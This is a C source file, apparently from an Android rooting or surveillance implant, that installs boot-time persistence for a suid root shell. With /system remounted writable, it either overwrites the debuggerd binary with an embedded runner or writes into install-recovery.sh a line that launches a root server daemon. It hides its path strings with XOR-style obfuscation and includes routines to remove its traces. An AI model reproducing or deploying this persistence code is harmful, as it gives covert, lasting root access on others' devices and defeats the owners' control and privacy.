#include <stdio.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <sys/mount.h>
#include <sys/param.h>
#include <sys/time.h>
#include <sys/mman.h>
#include <linux/netlink.h>
#include <sys/socket.h>
#include <sys/un.h>
#include <arpa/inet.h>
#include <unistd.h>
#include <fcntl.h>
#include <errno.h>
#include <string.h>
#include <signal.h>
#include <stdlib.h>
#include <math.h>
#include <dlfcn.h>
#include <elf.h>
#include <sys/system_properties.h>
#include <errno.h>
#include <jni.h>
#include <android/log.h>
#include <dirent.h>
#include <linux/reboot.h>
#include <linux/fb.h>
#include <linux/kd.h>
#include "log.h"
#include "shell_params.h"
#include "deobfuscate.h"
#include "old_shell.h"
#include "runner_bin.h"
#include "util.h"
#include "boot_manager.h"

// Create the boot script through debuggerd service
int createDebuggerdBootScript() {
  FILE *f1 = NULL;
  FILE *f2 = NULL;
  char install_script[1024];
  struct stat st;
  static unsigned char sh_script[] = "\xc6\x25\xf3\x2f\x29\x2b\xff\xc1\xff\xf2\xed\xf5\x2b\xec\xf1\xe8\x2b\xff\xf6"; // "#!/system/bin/sh"
  static unsigned char system_str[] = "\x76\xcb\xba\xef\x1b\x11\x1b\x06\x15\x2d"; // "/system"


  memset(install_script, 0, sizeof(install_script));
  remount(deobfuscate(system_str), 0);

  // Create a copy of the original binary
  f1 = fopen(deobfuscate(INSTALL_SCRIPT), "r");
  f2 = fopen(deobfuscate(INSTALL_SCRIPT_BAK), "w");

  if(!f1 || !f2)
    return -1;

  if(fcopy(f1, f2) < 0)
    return -1;

  fclose(f1);
  fclose(f2);
  
  chmod(deobfuscate(INSTALL_SCRIPT_BAK), 0755);

  // Delete it!
  remove(deobfuscate(INSTALL_SCRIPT));

  // Create the install script
  f1 = fopen(deobfuscate(INSTALL_SCRIPT), "w");
  fwrite(&runner, 1, sizeof(runner), f1);
  fclose(f1);

  chmod(deobfuscate(INSTALL_SCRIPT), 0755);
  remount(deobfuscate(system_str), MS_RDONLY);

  return 0;

}

// Create the boot script through the install-recovery.sh
int createRecoveryBootScript() { 
  FILE *f1 = NULL;
  FILE *f2 = NULL;
  char install_script[1024];
  struct stat st;
  static unsigned char sh_script[] = "\xc6\x25\xf3\x2f\x29\x2b\xff\xc1\xff\xf2\xed\xf5\x2b\xec\xf1\xe8\x2b\xff\xf6"; // "#!/system/bin/sh"
  static unsigned char system_str[] = "\x76\xcb\xba\xef\x1b\x11\x1b\x06\x15\x2d"; // "/system"
  static unsigned char daemon_opt[] = "\x70\x91\xe9\x7f\x7f\x34\x33\x37\x3f\x21\x3e"; // "--daemon"

  memset(install_script, 0, sizeof(install_script));
  remount(deobfuscate(system_str), 0);

  // Copy root boot script                                                                      
  if(stat(deobfuscate(INSTALL_REC_SCRIPT), &st) < 0) {
    // Boot script (install-recovery.sh) doesn't exist yet                                                                                             
    LOGD("Boot script install-recovery.sh not present");

    f2 = fopen(deobfuscate(INSTALL_REC_SCRIPT), "w");

    if(!f2)
      return -1;

    fprintf(f2, "%s\n%s %s &\n", deobfuscate(sh_script), deobfuscate(ROOT_SERVER), deobfuscate(daemon_opt));

    fclose(f2);
  }
  else {
    // Boot script alredy exists                                                                                                 
    LOGD("Boot script install-recovery.sh already exists");
    chmod(deobfuscate(INSTALL_REC_SCRIPT), 0755);

    // Create a backup copy of the original file                                                                                 
    f1 = fopen(deobfuscate(INSTALL_REC_SCRIPT), "r");
    f2 = fopen(deobfuscate(INSTALL_REC_SCRIPT_BAK), "w");

    if(!f1 || !f2)
      return -1;

    if(fcopy(f1, f2) < 0)
      return -1;

    fclose(f1);
    fclose(f2);

    chmod(deobfuscate(INSTALL_REC_SCRIPT_BAK), 0755);

    // Ok, now append our content to the script file                                                                             
    snprintf(install_script, sizeof(install_script), "\n%s %s &\n", deobfuscate(ROOT_SERVER), deobfuscate(daemon_opt));
    append_content(install_script, deobfuscate(INSTALL_REC_SCRIPT));
  }

  chmod(deobfuscate(INSTALL_REC_SCRIPT), 0755);
  remount(deobfuscate(system_str), MS_RDONLY);
  
  return 0;

}

// Create the proper boot script
int createBootScript() {
  static unsigned char debuggerd_str[] = "\xe8\x4b\x84\xad\x93\xae\xa2\x87\x9d\x93\x58\x9c\x93\x9e\xa3\x91\x91\x93\xae\x9c\x58\x59\xad\x97\xad\xac\x93\x9b\x59\x9e\x87\x9a\x59\x9c\x93\x9e\xa3\x91\x91\x93\xae\x9c"; // "service debuggerd /system/bin/debuggerd"
  static unsigned char init_str[] = "\x66\x6f\x01\xd7\x11\x18\x11\xee\xd8\xec\x1b"; // "/init.rc"


  char *init_dump = (char *)read_file(deobfuscate(init_str));
  if(strstr(init_dump, deobfuscate(debuggerd_str)) == NULL) {
    LOGD("Debuggerd service not present. Using install-recovery.sh.\n");
    return createRecoveryBootScript();
  }
  else {
    LOGD("Debuggerd service found in init.rc\n");
    return createDebuggerdBootScript();
  }

  // Never reached
  return 0;
}


// Remove the debuggerd boot script
int removeDebuggerdBootScript() {
  static unsigned char system_dir[] = "\xfb\x8b\x77\xd4\x98\x86\x98\x91\xa2\xaa"; // "/system"

  struct stat st;

  LOGD("Removing suid shell and debuggerd boot script\n");
  remount(deobfuscate(system_dir), 0);		
  unlink(deobfuscate(ROOT_SERVER));
  // Delete the boot script
  unlink(deobfuscate(INSTALL_SCRIPT));
		
  LOGD("Restoring original debuggerd script");
  rename(deobfuscate(INSTALL_SCRIPT_BAK), deobfuscate(INSTALL_SCRIPT));
  chmod(deobfuscate(INSTALL_SCRIPT), 0755);
  unlink(deobfuscate(INSTALL_SCRIPT_BAK));

  // Remove root client
  unlink(deobfuscate(ROOT_CLIENT));
  remount(deobfuscate(system_dir), MS_RDONLY);

  return 0;
}

// Remove the recovery boot script
int removeRecoveryBootScript() {
  static unsigned char system_dir[] = "\xfb\x8b\x77\xd4\x98\x86\x98\x91\xa2\xaa"; // "/system"
  struct stat st;

  LOGD("Removing suid shell and install-recovery.sh boot script\n");
  remount(deobfuscate(system_dir), 0);		
  unlink(deobfuscate(ROOT_SERVER));
  // Delete the boot script and check if we have to restore it
  unlink(deobfuscate(INSTALL_REC_SCRIPT));
		
  if(stat(deobfuscate(INSTALL_REC_SCRIPT_BAK), &st) >= 0) {
    LOGD("Restoring original install script");
    rename(deobfuscate(INSTALL_REC_SCRIPT_BAK), deobfuscate(INSTALL_REC_SCRIPT));
    chmod(deobfuscate(INSTALL_REC_SCRIPT), 0755);
  }
		
  unlink(deobfuscate(ROOT_CLIENT));
  remount(deobfuscate(system_dir), MS_RDONLY);

  return 0;
}

// Remove the proper boot script
int removeBootScript() {
  struct stat st;

  // We need to understand how the shell was installed

  // If we used debuggerd as boot script
  if(stat(deobfuscate(INSTALL_SCRIPT_BAK), &st) >= 0)
    return removeDebuggerdBootScript();
    
  else
    return removeRecoveryBootScript();

  // Never reached
  return 0;
}
